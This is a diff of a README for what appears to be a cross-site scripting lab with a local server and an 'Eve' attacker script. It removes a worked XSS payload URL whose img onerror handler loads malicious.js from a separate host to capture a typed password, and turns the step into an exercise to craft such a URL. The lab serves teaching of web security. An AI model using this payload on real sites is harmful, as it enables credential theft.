@@ -15,8 +15,6 @@ node server/server.js
 node attacker/eve.js
 ```
 
-Then open a browser, navigate to the webpage on ```localhost:3000?name=John``` and see the name John displayed. Then try visiting
-```
-localhost:3000?name=</p><img src="x" onerror="$.getScript('http://localhost:4000/malicious.js')"><p>
-```
-and type in your password. Eve will be listening!
+Then open a browser, navigate to the webpage on ```localhost:3000?name=John``` and see the name John displayed. 
+
+Now perform a penetration test on this application. Try to craft a url and make Eve listen in on the user's credentials!
